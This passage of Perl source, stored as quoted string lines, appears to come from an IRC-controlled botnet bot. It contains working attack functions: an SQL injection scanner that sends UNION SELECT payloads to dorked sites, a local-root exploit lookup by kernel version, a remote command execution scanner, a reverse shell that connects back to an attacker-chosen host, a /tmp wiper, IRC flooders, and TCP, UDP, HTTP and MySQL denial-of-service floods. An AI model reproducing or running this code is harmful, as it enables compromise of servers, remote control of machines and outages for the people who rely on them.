            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Lycos ",
            "\".scalar(@lycos).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Yahoo! ",
            "\".scalar(@ylist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Mozcox ",
            "\".scalar(@mzlist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Mama ",
            "\".scalar(@mamalist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Hotcox ",
            "\".scalar(@hlist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Altavista ",
            "\".scalar(@altlist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "Search[dot]com ",
            "\".scalar(@slist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "UoL ",
            "\".scalar(@ulist).\"",
            " Sites\");",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-Scanner",
            "FireBall ",
            "\".scalar(@flist).\"",
            " Sites\");",
            "            ",
            "            push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );",
            "            ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ scan ] ",
            "12Filtruje",
            "4 ][ \".scalar(@tot).\" ",
            "12Stron",
            "4 ] \");",
            "            my @puliti=&unici(@tot);",
            "            ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ SQL ] ",
            "12$dork",
            "4 ][ \".scalar(@puliti).\" ",
            "12Stron",
            "4 ] \");",
            "         ",
            "            my $uni=scalar(@puliti);",
            "                  ",
            "                  foreach my $sito (@puliti) {",
            "              ",
            "                  $contatore++;",
            "                    if ($contatore %5==0){",
            "                       sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ scan ] ",
            "12Skanuje",
            "4 ][ \".$contatore.\" ",
            "4 \".$uni. \" ",
            "12Stron",
            "4 ] \");",
            "                    }",
            "                  sleep 3;",
            "                    if ($contatore==$uni-1){",
            "                     sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ scan ] ",
            "12Koniec:",
            "4 $bug $dork ] \");",
            "                    }   ",
            "                  sleep 3;",
            "                    my $site=\"http://\".$sito.$bug;",
            "                  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ sql ] ",
            "12Sprawdzam: ",
            "4$site ",
            "12cols: ",
            "4 $columns ] \");",
            "         ",
            "         $w=int rand(999);   ",
            "         $w=$w*1000;",
            "         for($i=1;$i<=$columns;$i++) {",
            "            splice(@col,0,$#col+1);",
            "            for($j=1;$j<=$i;$j++) {",
            "               push(@col,$w+$j);",
            "            }   ",
            "            $tmp=join(\",\",@col);",
            "            $test=$site.\"-1+UNION+SELECT+\".$tmp.\"/*\";",
            "            print $test.\"\\n\";",
            "            $result=get_html($test);",
            "            $result =~ s/\\/\\*\\*\\///g;",
            "            $result =~ s/UNION([^(\\*)]*)//g;",
            "            for($k=1;$k<=$i;$k++) {",
            "               $n=$w+$k;",
            "                  if($result =~ /$n/){",
            "                     splice(@col2,0,$#col2+1);",
            "                        for($s=1;$s<=$i;$s++) {",
            "                           push(@col2,$s); ",
            "                        }",
            "                     $tmp2=join(\",\",@col2);",
            "                     $test2=\"+UNION+SELECT+\".$tmp2.\"/*\";",
            "                     push @{$dane{$test2}},$k;",
            "                  } ",
            "            }",
            "         }",
            "         for $klucz (keys %dane) {",
            "            foreach $i(@{$dane{$klucz}}) {",
            "               $klucz =~ s/$i/",
            "            }",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "8,1 [ ",
            "vuln",
            "9,1 [  \".$site.\"-1\".$klucz.\"  ] ",
            " \");",
            "         }",
            "         %dane=();      ",
            "            }",
            "      }",
            "   delproc($$);",
            "   exit;",
            "   }",
            "#######  SQL SCANNER  #########",
            "if ($funcarg =~ /^autoscan\\s+(.*)\\s+http\\:\\/\\/(.*?)\\/(.*?)\\s+(\\d+)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (my $d=fork()) {",
            "addproc($d,\"[String] $2\");",
            "exit;",
            "} else {",
            "      $kto = $1;",
            "      $host = $2;",
            "      $skrypt = $3;",
            "      $czekac=$4;",
            "      ",
            "      #http://ttl.ugu.pl/string/index.php",
            "      my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "      print $socke \"GET /$skrypt HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "      ",
            "      my @r = <$socke>;",
            "      $page=\"@r\";",
            "      $page =~ s/!scan(\\s+)//g;",
            "      $page =~ s/!scan(.)//g;",
            "      $page =~ s/\\<.*\\>//g;",
            "      ",
            "      @lines = split (/\\n/, $page);",
            "      $ile=scalar(@lines);",
            "            ",
            "      ",
            "      for($i=9;$i<=$ile;$i+=4) {",
            "         for($j=0;$j<4;$j++) {",
            "            #print $lines[$i+$j].\"\\n\";",
            "            ",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :$kto $lines[$i+$j]\");",
            "            ",
            "            sleep 10;",
            "         }",
            "         ",
            "         sleep $czekac*60;",
            "      }",
            "   }",
            "      delproc($$);",
            "      exit;",
            "   }",
            "#######  SQL SCANNER  #########",
            "if ($funcarg =~ /^sql\\s+(.*)\\s+(\\d+)/){",
            "   if (my $pid = fork()) {",
            "      waitpid($pid, 0);",
            "   } else {",
            "      if (my $d=fork()) {",
            "         addproc($d,\"[SQL1] $1 $2\");",
            "         exit;",
            "      } else {",
            "         my $site=$1;",
            "         my $columns=$2;",
            "         sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ sql ] ",
            "12Sprawdzam: ",
            "4$site ",
            "12cols: ",
            "4 $columns ] \");",
            "         ",
            "         $w=int rand(999);   ",
            "         $w=$w*1000;",
            "         for($i=1;$i<=$columns;$i++) {",
            "            splice(@col,0,$#col+1);",
            "            for($j=1;$j<=$i;$j++) {",
            "               push(@col,$w+$j);",
            "            }   ",
            "            $tmp=join(\",\",@col);",
            "            $test=$site.$bug.\"-1+UNION+SELECT+\".$tmp.\"/*\";",
            "                        #$result=query($test);",
            "            $result=get_html($test);",
            "            $result =~ s/\\/\\*\\*\\///g;",
            "            $result =~ s/UNION([^(\\*)]*)//g;",
            "            for($k=1;$k<=$i;$k++) {",
            "               $n=$w+$k;",
            "                  if($result =~ /$n/){",
            "                     splice(@col2,0,$#col2+1);",
            "                        for($s=1;$s<=$i;$s++) {",
            "                           push(@col2,$s); ",
            "                        }",
            "                     $tmp2=join(\",\",@col2);",
            "                     $test2=\"+UNION+SELECT+\".$tmp2.\"/*\";",
            "                     push @{$dane{$test2}},$k;",
            "                  } ",
            "            }",
            "         }",
            "         for $klucz (keys %dane) {",
            "            foreach $i(@{$dane{$klucz}}) {",
            "               $klucz =~ s/$i/",
            "            }",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "8,1 [ ",
            "vuln",
            "9,1 [  \".$site.$bug.\"-1\".$klucz.\"  ] ",
            " \");",
            "         }",
            "         sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "4,16 [ sql ] ",
            "12Koniec ",
            "4 ] \");      ",
            "      }",
            "   delproc($$);",
            "   exit;",
            "   }",
            "#######  SQL SCANNER  #########",
            "######################",
            "#        Rootable                                     #",
            "######################",
            "if ($funcarg =~ /^rootable/) { ",
            "my $khost = `uname -r`;",
            "my $currentid = `whoami`;",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Rootable",
            "12] Currently you are \".$currentid.\" \");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Rootable",
            "12] The kernel of this box is \".$khost.\" \");",
            "chomp($khost);",
            "   my %h;",
            "   $h{'w00t'} = { ",
            "      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] ",
            "   };",
            "   $h{'brk'} = {",
            "      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] ",
            "   };",
            "   $h{'ave'} = {",
            "      vuln=>['2.4.19','2.4.20'] ",
            "   };",
            "   $h{'elflbl'} = {",
            "      vuln=>['2.4.29'] ",
            "   };",
            "   $h{'elfdump'} = {",
            "      vuln=>['2.4.27']",
            "   };",
            "   $h{'expand_stack'} = {",
            "      vuln=>['2.4.29'] ",
            "   };",
            "   $h{'h00lyshit'} = {",
            "      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']",
            "   };",
            "   $h{'kdump'} = {",
            "      vuln=>['2.6.13'] ",
            "   };",
            "   $h{'km2'} = {",
            "      vuln=>['2.4.18','2.4.22']",
            "   };",
            "   $h{'krad'} = {",
            "      vuln=>['2.6.11']",
            "   };",
            "   $h{'krad3'} = {",
            "      vuln=>['2.6.11','2.6.9']",
            "   };",
            "   $h{'local26'} = {",
            "      vuln=>['2.6.13']",
            "   };",
            "   $h{'loko'} = {",
            "      vuln=>['2.4.22','2.4.23','2.4.24'] ",
            "   };",
            "   $h{'mremap_pte'} = {",
            "      vuln=>['2.4.20','2.2.25','2.4.24'] ",
            "   };",
            "   $h{'newlocal'} = {",
            "      vuln=>['2.4.17','2.4.19','2.4.18'] ",
            "   };",
            "   $h{'ong_bak'} = {",
            "      vuln=>['2.4.','2.6.'] ",
            "   };",
            "   $h{'ptrace'} = {",
            "      vuln=>['2.2.','2.4.22'] ",
            "   };",
            "   $h{'ptrace_kmod'} = {",
            "      vuln=>['2.4.2'] ",
            "   };",
            "   $h{'ptrace24'} = {",
            "      vuln=>['2.4.9'] ",
            "   };",
            "   $h{'pwned'} = {",
            "      vuln=>['2.4.','2.6.'] ",
            "   };",
            "   $h{'py2'} = {",
            "      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] ",
            "   };",
            "   $h{'raptor_prctl'} = {",
            "      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] ",
            "   };",
            "   $h{'prctl3'} = {",
            "      vuln=>['2.6.13','2.6.17','2.6.9'] ",
            "   };",
            "   $h{'remap'} = {",
            "      vuln=>['2.4.'] ",
            "   };",
            "   $h{'rip'} = {",
            "      vuln=>['2.2.'] ",
            "   };",
            "   $h{'stackgrow2'} = {",
            "      vuln=>['2.4.29','2.6.10'] ",
            "   };",
            "   $h{'uselib24'} = {",
            "      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] ",
            "   };",
            "   $h{'newsmp'} = {",
            "      vuln=>['2.6.'] ",
            "   };",
            "   $h{'smpracer'} = {",
            "      vuln=>['2.4.29'] ",
            "   };",
            "   $h{'loginx'} = {",
            "      vuln=>['2.4.22'] ",
            "   };",
            "   $h{'exp.sh'} = {",
            "      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] ",
            "   };",
            "   $h{'prctl'} = {",
            "      vuln=>['2.6.'] ",
            "   };",
            "   $h{'kmdx'} = {",
            "      vuln=>['2.6.','2.4.'] ",
            "   };",
            "   $h{'raptor'} = {",
            "      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] ",
            "   };",
            "   $h{'raptor2'} = {",
            "      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] ",
            "   };",
            "foreach my $key(keys %h){",
            "foreach my $kernel ( @{ $h{$key}{'vuln'} } ){ ",
            "   if($khost=~/^$kernel/){",
            "   chop($kernel) if ($kernel=~/.$/);",
            "   sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Rootable",
            "12] Possible Local Root Exploits: \". $key .\" \");",
            "      }",
            "   }",
            "######################",
            "#       MAILER       # ",
            "######################",
            "if ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Mailer",
            "12]  Mailer :. |  Sending Mail to : 2 $3\");",
            "$subject = $1;",
            "$sender = $2;",
            "$recipient = $3;",
            "@corpo = $4;",
            "$mailtype = \"content-type: text/html\";",
            "$sendmail = '/usr/sbin/sendmail';",
            "open (SENDMAIL, \"| $sendmail -t\");",
            "print SENDMAIL \"$mailtype\\n\";",
            "print SENDMAIL \"Subject: $subject\\n\";",
            "print SENDMAIL \"From: $sender\\n\";",
            "print SENDMAIL \"To: $recipient\\n\\n\";",
            "print SENDMAIL \"@corpo\\n\\n\";",
            "close (SENDMAIL);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Mailer",
            "12]   Mailer :. |  Mail Sent To : 2 $recipient\");",
            "######################",
            "#   End of MAILER    # ",
            "######################",
            "# A /tmp cleaner",
            "if ($funcarg =~ /^cleartmp/) { ",
            "    system 'cd /tmp;rm -rf *';",
            "         sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9TMPCleaner",
            "12] /tmp is Cleaned\");",
            "         }",
            "#-#-#-#-#-#-#-#-#",
            "# Flooders IRC  #",
            "#-#-#-#-#-#-#-#-#         ",
            "# msg, @msgflood <who>",
            "if ($funcarg =~ /^msgflood (.+?) (.*)/) {",
            "   for($i=0; $i<=10; $i+=1){",
            "      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" \".$2);",
            "   }",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9MSGFlood",
            "14 Excecuted on \".$1.\" \");",
            "         ",
            "# dccflood, @dccflood <who>",
            "if ($funcarg =~ /^dccflood (.*)/) {",
            "   for($i=0; $i<=10; $i+=1){",
            "      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001DCC CHAT chat 1121485131 1024\\001\\n\");",
            "   }",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9DCCFlood",
            "14 Excecuted on \".$1.\" \");",
            "}      ",
            "# ctcpflood, @ctcpflood <who>",
            "if ($funcarg =~ /^ctcpflood (.*)/) {",
            "   for($i=0; $i<=10; $i+=1){",
            "      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001VERSION\\001\\n\");",
            "      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001PING\\001\\n\");",
            "   }",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9CTCPFlood",
            "14 Excecuted on \".$1.\" \");",
            "}      ",
            "# noticeflood, @noticeflood <who>",
            "   if ($funcarg =~ /^noticeflood (.*)/) {",
            "      for($i=0; $i<=10; $i+=1){",
            "         sendraw($IRC_cur_socket, \"NOTICE \".$1.\" :w3tFL00D\\n\");",
            "   }",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9NoticeFlood",
            "14 Excecuted on \".$1.\" \");",
            "}      ",
            "# Channel Flood, @channelflood",
            "if ($funcarg =~ /^channelflood/) {",
            "   for($i=0; $i<=25; $i+=1){ ",
            "      sendraw($IRC_cur_socket, \"JOIN #\".(int(rand(99999))) );",
            "   }",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9ChannelFlood",
            "14 Excecuted \");",
            "# Maxi Flood, @maxiflood",
            "if ($funcarg =~ /^maxiflood(.*)/) {",
            "   for($i=0; $i<=15; $i+=1){",
            "         sendraw($IRC_cur_socket, \"NOTICE \".$1.\" :w3tFl00D\\n\");",
            "         sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001VERSION\\001\\n\");",
            "         sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001PING\\001\\n\");",
            "         sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :w3tFl00D\\n\");         ",
            "   }",
            "      sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9M4Xi-Fl00d",
            "14 Excecuted on \".$1.\" \");",
            "######################",
            "#  irc    #",
            "######################",
            "         if ($funcarg =~ /^reset/) {",
            "            sendraw($IRC_cur_socket, \"QUIT :\");",
            "         }",
            "         if ($funcarg =~ /^join (.*)/) {",
            "            sendraw($IRC_cur_socket, \"JOIN \".$1);",
            "         }",
            "         if ($funcarg =~ /^part (.*)/) {",
            "            sendraw($IRC_cur_socket, \"PART \".$1);",
            "         }",
            "         if ($funcarg =~ /^voice (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl +v \".$1);",
            "           }",
            "         if ($funcarg =~ /^dcoxice (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl -v \".$1);",
            "           }",
            "         if ($funcarg =~ /^halfop (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl +h \".$1);",
            "           }",
            "         if ($funcarg =~ /^dehalfop (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl -h \".$1);",
            "           }",
            "         if ($funcarg =~ /^owner (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl +q \".$1);",
            "           }",
            "         if ($funcarg =~ /^deowner (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl -q \".$1);",
            "         }",
            "         if ($funcarg =~ /^op (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl +o \".$1);",
            "           }         ",
            "         if ($funcarg =~ /^deop (.*)/) { ",
            "            sendraw($IRC_cur_socket, \"MODE $printl -o \".$1);",
            "           }",
            "######################",
            "#End of Join And Part#",
            "######################",
            "######################",
            "#     TCPFlood       #",
            "######################",
            "         if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9TCP-DDOS",
            "12] Attacking ",
            "4 \".$1.\":\".$2.\" ",
            "12for ",
            "4 \".$3.\" ",
            "12seconds.\");",
            "            my $itime = time;",
            "            my ($cur_time);",
            "            $cur_time = time - $itime;",
            "            while ($3>$cur_time){",
            "               $cur_time = time - $itime;",
            "               &tcpflooder(\"$1\",\"$2\",\"$3\");",
            "            }",
            "            sendraw($IRC_cur_socket,\"PRIVMSG $printl :",
            "9TCP-DDOS",
            "12] Attack done ",
            "4 \".$1.\":\".$2.\".\");",
            "         }",
            "######################",
            "#  End of TCPFlood   #",
            "######################",
            "######################",
            "#               SQL Fl00dEr                     #",
            "######################",
            "if ($funcarg =~ /^sqlflood\\s+(.*)\\s+(\\d+)/) {",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-DDOS",
            "12] Attacking",
            "4 \".$1.\" ",
            "12 on port 3306 for ",
            "4 \".$2.\" ",
            "12 seconds ",
            ".\");",
            "my $itime = time;",
            "my ($cur_time);",
            "$cur_time = time - $itime;",
            "while ($2>$cur_time){",
            "$cur_time = time - $itime;",
            "   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);",
            "   print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";",
            "close($socket);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9SQL-DDOS",
            "12] Attacking done",
            "4 \".$1.\".\");",
            "######################",
            "#   Back Connect     #",
            "######################",
            "         if ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {",
            "            my $host = \"$1\";",
            "            my $porta = \"$2\";",
            "            my $proto = getprotobyname('tcp');",
            "            my $iaddr = inet_aton($host);",
            "            my $paddr = sockaddr_in($porta, $iaddr);",
            "            my $shell = \"/bin/sh -i\";",
            "            if ($^O eq \"MSWin32\") {",
            "               $shell = \"cmd.exe\";",
            "            }",
            "            socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";",
            "            connect(SOCKET, $paddr) or die \"connect: $!\";",
            "            open(STDIN, \">&SOCKET\");",
            "            open(STDOUT, \">&SOCKET\");",
            "            open(STDERR, \">&SOCKET\");",
            "            system(\"$shell\");",
            "            close(STDIN);",
            "            close(STDOUT);",
            "            close(STDERR);",
            "            if ($estatisticas){",
            "               sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Back-Connect",
            "12] Connecting to ",
            "4 $host:$porta\");",
            "            }",
            "         }",
            "######################",
            "#End of  Back Connect#",
            "######################",
            "######################",
            "#    MULTI SCANNER   #",
            "######################",
            "if ($funcarg =~ /^multiscan\\s+(.*?)\\s+(.*)/){",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "exit;",
            "} else {",
            "my $bug=$1;",
            "my $dork=$2;",
            "my $contatore=0;",
            "                  my ($type,$space);",
            "                  my %hosts;",
            "                  ### Start Message",
            "                  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "12] Starting Scan for ",
            "4$bug $dork\");",
            "                  sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "12] Initializing on ",
            "12Search Engines \");",
            "                  ### End of Start Message",
            "# Starting Google",
            "   my @glist=&google($dork);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9Multi-Scan",
            "\".scalar(@glist).\"",
            " Sites\");",
            "   my @mlist=&msn($dork);",
            "   my @asklist=&ask($dork);",
            "   my @allist=&alltheweb($dork);",
            "   my @aollist=&aol($dork);",
            "   my @lycos=&lycos($dork);",
            "   my @ylist=&yahoo($dork);",
            "   my @mzlist=&mozcox($dork);",
            "   my @mamalist&mamma($dork);",
            "   my @hlist=&hotcox($dork);",
            "   my @altlist=&altavista($dork);",
            "   my @slist=&search($dork);",
            "   my @ulist=&uol($dork);",
            "   my @fireball=&fireball($dork);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "\".scalar(@glist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "MSN ",
            "\".scalar(@mlist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "AllTheWeb ",
            "\".scalar(@allist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Ask.com ",
            "\".scalar(@asklist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "AOL ",
            "\".scalar(@aollist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Lycos ",
            "\".scalar(@lycos).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Yahoo! ",
            "\".scalar(@ylist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Mozcox ",
            "\".scalar(@mzlist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Mama ",
            "\".scalar(@mamalist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Hotcox ",
            "\".scalar(@hlist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Altavista ",
            "\".scalar(@altlist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "Search[dot]com ",
            "\".scalar(@slist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "UoL ",
            "\".scalar(@ulist).\"",
            " Sites\");",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9Multi-Scan",
            "FireBall ",
            "\".scalar(@flist).\"",
            " Sites\");",
            "push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );",
            "my @puliti=&unici(@tot);",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9Multi-Scan",
            "  Results: Total:",
            "\".scalar(@tot).\"",
            " Sites and Cleaned: ",
            "\".scalar(@puliti).\"",
            " for $dork \");",
            "my $uni=scalar(@puliti);",
            "foreach my $sito (@puliti)",
            "$contatore++;",
            "if ($contatore %100==0){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9Multi-Scan",
            " Exploiting  ",
            "\".$contatore.\"",
            "  of  ",
            "\".$uni. \"",
            " Sites\");",
            "if ($contatore==$uni-1){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9Multi-Scan",
            " Finished for  $dork\");",
            "### Print CMD and TEST CMD###",
            "my $test=\"http://\".$sito.$bug.$id.\"?\";",
            "my $print=\"http://\".$sito.$bug.$cmd.\"?\";",
            "### End of Print CMD and TEST CMD###",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "$ua->timeout(4);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "my $re=$response->content;",
            "if($re =~ /Mic22/ && $re =~ /uid=/){",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9Multi-Scan",
            "  Safe Mode = OFF :. | Vuln:  $print \");",
            "elsif($re =~ /Mic22/)",
            "my $hs=geths($print); $hosts{$hs}++;",
            "if($hosts{$hs}==\"1\"){",
            "sendraw($IRC_cur_socket, \"PRIVMSG $printl ",
            "9Multi-Scan",
            "  Safe Mode =  ON :. | Vuln:  $print  \");",
            "exit;",
            "######################",
            "#End of MultiSCANNER #",
            "######################",
            "######################",
            "#     HTTPFlood      #",
            "######################",
            "         if ($funcarg =~ /^httpflood\\s+(.*)\\s+(\\d+)/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "9HTTP DDoS",
            "12:.",
            "12 Attacking ",
            "4 \".$1.\" ",
            "12 on port 80 for ",
            "4 \".$2.\" ",
            "12 seconds .\");",
            "            my $itime = time;",
            "            my ($cur_time);",
            "            $cur_time = time - $itime;",
            "            while ($2>$cur_time){",
            "               $cur_time = time - $itime;",
            "               my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);",
            "               print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";",
            "               close($socket);",
            "            }",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "9HTTP DDoS",
            "12:.",
            "12 Attacking done ",
            "4 \".$1.\".\");",
            "         }",
            "######################",
            "#  End of HTTPFlood  #",
            "######################",
            "######################",
            "#     UDPFlood       #",
            "######################",
            "         if ($funcarg =~ /^udpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "12.:",
            "9UDP DDoS",
            "12:.",
            "12 Attacking ",
            "4 \".$1.\" ",
            "12 with ",
            "4 \".$2.\" ",
            "12 Kb Packets for ",
            "4 \".$3.\" ",
            "12 seconds.\");",
            "            my ($dtime, %pacotes) = udpflooder(\"$1\", \"$2\", \"$3\");",
            "            $dtime = 1 if $dtime == 0;",
            "            my %bytes;",
            "            $bytes{igmp} = $2 * $pacotes{igmp};",
            "            $bytes{icmp} = $2 * $pacotes{icmp};",
            "            $bytes{o} = $2 * $pacotes{o};",
            "            $bytes{udp} = $2 * $pacotes{udp};",
            "            $bytes{tcp} = $2 * $pacotes{tcp};",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "9UDP-DDos",
            "12Results",
            "4 \".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024).\" ",
            "12Kb in",
            "4 \".$dtime.\" ",
            "12seconds to",
            "4 \".$1.\".\");",
            "         }",
            "######################",
            "#  End of Udpflood   #",
            "######################",
            "         exit;",
            "      }",
            "   }",
            "sub ircase {",
            "   my ($kem, $printl, $case) = @_;",
            "   if ($case =~ /^join (.*)/) {",
            "      j(\"$1\");",
            "   }",
            "   if ($case =~ /^part (.*)/) {",
            "      p(\"$1\");",
            "   }",
            "   if ($case =~ /^rejoin\\s+(.*)/) {",
            "      my $chan = $1;",
            "      if ($chan =~ /^(\\d+) (.*)/) {",
            "         for (my $ca = 1; $ca <= $1; $ca++ ) {",
            "            p(\"$2\");",
            "            j(\"$2\");",
            "         }",
            "      } else {",
            "         p(\"$chan\");",
            "         j(\"$chan\");",
            "      }",
            "   }",
            "   if ($case =~ /^op/) {",
            "      op(\"$printl\", \"$kem\") if $case eq \"op\";",
            "      my $oarg = substr($case, 3);",
            "      op(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^deop/) {",
            "      deop(\"$printl\", \"$kem\") if $case eq \"deop\";",
            "      my $oarg = substr($case, 5);",
            "      deop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);",
            "   }",
            "   if ($case =~ /^msg\\s+(\\S+) (.*)/) {",
            "      msg(\"$1\", \"$2\");",
            "   }",
